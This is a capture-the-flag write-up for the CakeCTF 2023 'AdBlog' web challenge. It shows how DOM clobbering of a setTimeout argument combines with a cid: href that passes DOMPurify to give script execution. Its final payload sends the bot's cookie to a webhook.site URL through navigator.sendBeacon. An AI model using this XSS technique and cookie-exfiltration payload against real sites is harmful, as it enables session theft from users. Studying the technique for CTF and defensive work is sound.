# AdBlog

## Description

> Post your article anonymously [here](http://adblog.2023.cakectf.com:8001/)!
>
> \* Please [report us](http://adblog.2023.cakectf.com:8002/) if you find any sensitive/harmful posts.
>
> Attachments: adblog_bf9113f56e16736e143208ac49829609.tar.gz

<details><summary>Attachment file tree</summary>

```console
$ tree adblog
adblog
├── crawler
│   ├── crawler.js
│   ├── Dockerfile
│   └── package.json
├── docker-compose.yml
├── exploit1.html
├── leak.html
├── redis
│   ├── Dockerfile
│   └── redis.conf
├── report
│   ├── app.py
│   ├── Dockerfile
│   ├── templates
│   │   └── index.html
│   └── uwsgi.ini
├── serve.py
└── service
    ├── app.py
    ├── Dockerfile
    ├── static
    │   ├── css
    │   │   ├── ad-style.css
    │   │   └── simple-v1.min.css
    │   └── js
    │       └── ads.js
    ├── templates
    │   ├── blog.html
    │   └── index.html
    └── uwsgi.ini

10 directories, 21 files
```

</details>

## Solution

Looking at the source code:

```javascript
// adblog/crawler/crawler.js

    // (snip)

    const page = await browser.newPage();
    try {
        await page.setCookie({
            name: 'flag',
            value: flag,
            domain: new URL(base_url).hostname,
            httpOnly: false,
            secure: false
        });

    // (snip)
```

The purpose of this challenge is to get the flag set in the crawler's cookie.

Since httpOnly is set as false, we can get the flag by using  `document.cookie` JavaScript API [^1].

```html
<!-- adblog/service/templates/blog.html -->
    <!-- (snip) -->

    <script src="/static/js/ads.js"></script>
    <script>
     let content = DOMPurify.sanitize(atob("{{ content }}"));
     document.getElementById("content").innerHTML = content;

     window.onload = async () => {
       if (await detectAdBlock()) {
         showOverlay = () => {
           document.getElementById("ad-overlay").style.width = "100%";
         };
       }

       if (typeof showOverlay === 'undefined') {
         document.getElementById("ad").style.display = "block";
       } else {
         setTimeout(showOverlay, 1000);
       }
     }
    </script>

    <!-- (snip) -->
```

```js
// adblog/service/static/js/ads.js

const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';

async function detectAdBlock(callback) {
    try {
        let res = await fetch(ADS_URL, { method: 'HEAD' });
        return res.status !== 200;
    } catch {
        return true;
    }
}
```

We can define a global variable named showOverlay due to DOM Clobbering [^2].
The showOverlay variable is controllable by user and set as the first argument of `setTimeout`.

The first argument of `setTimeout` can be set with JavaScript code, similar to `eval` [^3].
Also, if an object is set as the first argument of setTimeout, the result of toString() is passed.

Tested in Console panel in Chrome DevTools:

```javascript
class Foo {
  toString() {
    return `console.log("injected")`;
  }
}

const foo = new Foo();
setTimeout(foo);
// output => injected
```

Also, toString() of an anchor tag will return href string [^4].

Tested in Console panel in Chrome DevTools e.g. `<a href="foo:bar">`:

```javascript
const anchor = document.createElement('a');

// with `foo` protocol scheme
anchor.href = "foo:bar";
anchor.toString();
// output => 'foo:bar'

// without protocol scheme
anchor.href = "bar";
anchor.toString();
// output => 'http://localhost/bar'
```

The cid protocol scheme can be bypassed with `DOMPurify.sanitize` [^5].

Tested in Console panel in Chrome DevTools in <https://cure53.de/purify>:

```javascript
DOMPurify.sanitize('<a href="cid:alert(1);">');
// output => '<a href="cid:alert(1);"></a>'

DOMPurify.sanitize('<a href="foo:alert(1);">');
// output => '<a></a>'

DOMPurify.sanitize('<a href="alert(1);">');
// output => '<a href="alert(1);"></a>'
```

DOMPurify allows a href attribute even without the protocol scheme.
But if there is no `cid:`, it will execute as `setTimeout("http://localhost/alert(1);", 1000)`, an arbitrary code execution is failed.

When executed as JavaScript code, `cid:` is interpreted as a label [^6] rather than a protocol scheme, and it has no effect on the JavaScript code.

Tested:

```html
<!-- index.html -->
<!DOCTYPE html>
<html>
  <head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
  </head>
  <body>
    <div id="content"></div>
    <script>
      let content = DOMPurify.sanitize(
        `<a id=showOverlay href=cid:console.log("injected");>`
      );
      document.getElementById("content").innerHTML = content;

      window.onload = async () => {
        setTimeout(showOverlay, 1000);
      };
    </script>
  </body>
</html>
```

I created the above index.html and hosted with Python http.server `python3 -m http.server 80` and accessed `http://localhost`, then got `injected` output in Console panel in Chrome DevTools.
An arbitrary JavaScript code execution was successful in my test.

Finally, I can send the bot's cookie value to an arbitrary URL by using `navigator.sendBeacon` [^7].

Therefore, I can get flag by using the following payload:

```html
<a id=showOverlay href="cid:navigator.sendBeacon('https://webhook.site/<your webhook>',document.cookie);">
```

## Footnotes

[^1]: [Using HTTP cookies - HTTP \| MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
    > A cookie with the HttpOnly attribute is inaccessible to the JavaScript Document.cookie API; it's only sent to the server.

[^2]: [DOM clobbering \| Web Security Academy](https://portswigger.net/web-security/dom-based/dom-clobbering)

[^3]: [setTimeout() global function - Web APIs \| MDN](https://developer.mozilla.org/en-US/docs/Web/API/setTimeout#code)
    > code
    >
    > An alternative syntax that allows you to include a string instead of a function, which is compiled and executed when the timer expires. This syntax is not recommended for the same reasons that make using eval() a security risk.

[^4]: [Dom Clobbering - HackTricks | Basics](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering#basics)
    > Interestingly, when you use a form element to clobber a variable, you will get the toString value of the element itself: [object HTMLFormElement] but with anchor the toString will be the anchor href. Therefore, if you clobber using the a tag, you can control the value when it's treated as a string:

[^5]: [Dom Clobbering - HackTricks | Clobbering window.someObject](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering#clobbering-window.someobject)
    > Trick: DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes.

[^6]: [Labeled statement - JavaScript \| MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label)

[^7]: [Navigator: sendBeacon() method - Web APIs \| MDN](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon)
